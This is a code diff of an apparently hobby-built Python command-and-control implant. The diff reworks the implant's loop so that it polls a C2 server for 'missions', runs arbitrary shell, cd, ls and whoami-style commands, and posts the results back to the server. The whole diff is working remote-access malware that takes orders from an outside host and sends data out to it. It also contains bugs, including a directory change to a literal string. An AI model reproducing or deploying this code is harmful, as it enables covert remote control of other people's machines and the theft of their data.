@@ -63,6 +63,13 @@ class Spy:
 				self.lastcheckin = response_data.get('lastcheckin')
 		return response_data
 
+class Command:
+	def __init__(self, mission_id, command):
+		self.mission_id=mission_id
+		self.command=command
+
+	def __eq__(self, other):
+		return self.mission_id == other.mission_id
 
 async def get_env(spy, server):
 	ops = platform.system()
@@ -78,13 +85,6 @@ async def get_env(spy, server):
 	print("[+] Connected to the C2 server")
 	print("[+] Spy GUID " + str(spy.guid))
 
-async def check_in(spy, server):
-	data = {"id": spy.id, "active": spy.active}
-	async with aiohttp.ClientSession() as session:
-		async with session.post(f"{server}/beacon", json=data) as response:
-			response_text = await response.text()  # Get the response text
-			return await response.json()
-
 
 async def cmd_shell(command):
     # Execute the command in a separate thread and then read the output
@@ -93,9 +93,11 @@ async def cmd_shell(command):
 	print(output)
 	return output
 
+
 async def cmd_cd(newdir):
 	os.chdir('newdir')
 	return "Directory changed to "+newdir
+
 
 async def cmd_whereami():
     # User information
@@ -115,7 +117,8 @@ async def cmd_whereami():
 	return output
 	
 
-#def cmd_upload():
+#async def cmd_upload():
+
 
 async def cmd_ls(dir):
 	def get_file_attributes(path):
@@ -153,45 +156,54 @@ async def cmd_ls(dir):
 
 	return output
 
-#def cmd_env():
+
+
+async def check_in(spy, server):	# Confirm the alive status, and return spy info in json format
+	async with aiohttp.ClientSession() as session:
+		async with session.get(f"{server}/spy/{spy.id}") as response:
+			response_text = await response.text()  
+			return await response.json()
 
 
 async def main(ip, port):
 	server = f"http://{ip}:{port}"
 	newspy = Spy()
-	await get_env(newspy, server) 
+	await get_env(newspy, server)  
+	cmdobjlist=[]
 	while True:
-		check_in_response = await check_in(newspy, server)
-		command = check_in_response.get('command')
-		if command:
-			cmd_maincmd=' '.join(command.split()[0:1])
-			cmd_subcmd = ' '.join(command.split()[1:])
-			if cmd_maincmd =='shell':
-				result = await cmd_shell(cmd_subcmd)
-			if cmd_maincmd =='cd':
-				if cmd_subcmd =='':
-					cmd_subcmd=os.getcwd()
-				result = await cmd_cd(cmd_subcmd)				
+		spy_data = await check_in(newspy, server)    # spy_data is single spy's json data
+		for mission in spy_data['missionlist']:
+			if not mission['iscompleted']:
+				cmdobj=Command(mission['id'], mission['command'])
+				if cmdobj not in cmdobjlist:
+					print("Mission id: "+str(cmdobj.mission_id)+" Mission command "+cmdobj.command)
+					cmdobjlist.append(cmdobj)
+		if cmdobjlist:	# If more than 1 command are not completed
+			for cmdobj in cmdobjlist:
+				cmd_maincmd=' '.join(cmdobj.command.split()[0:1])
+				cmd_subcmd = ' '.join(cmdobj.command.split()[1:])
+				if cmd_maincmd =='shell':
+					result = await cmd_shell(cmd_subcmd)
+				if cmd_maincmd =='cd':
+					if cmd_subcmd =='':
+						cmd_subcmd=os.getcwd()
+					result = await cmd_cd(cmd_subcmd)				
 
-			if cmd_maincmd =='ls':
-				if cmd_subcmd =='':
-					cmd_subcmd=os.getcwd()
-				result = await cmd_ls(cmd_subcmd)
+				if cmd_maincmd =='ls':
+					if cmd_subcmd =='':
+						cmd_subcmd=os.getcwd()
+					result = await cmd_ls(cmd_subcmd)
 
-			if cmd_maincmd =='whereami':
-				result = await cmd_whereami()
+				if cmd_maincmd =='whereami':
+					result = await cmd_whereami()
 				
-
-		#	if cmd_maincmd =='ipconfig':
 				
-		#	if cmd_maincmd =='whoami':
-				
-			result_bytes = result.encode("ascii")
-			base64_bytes = base64.b64encode(result_bytes)
-			output = base64_bytes.decode("ascii")
-			print(output)
-			async with aiohttp.ClientSession() as session:
-				await session.post(f'{server}/result/{newspy.id}', json={"command": command, "result": output})
+				result_bytes = result.encode("ascii")
+				base64_bytes = base64.b64encode(result_bytes)
+				output = base64_bytes.decode("ascii")
+				cmdobjlist.remove(cmdobj)
+				async with aiohttp.ClientSession() as session:
+					await session.post(f'{server}/spy/{newspy.id}/{cmdobj.mission_id}/output', json={"output": result})
 		await asyncio.sleep(3)
 
 if __name__ == "__main__":
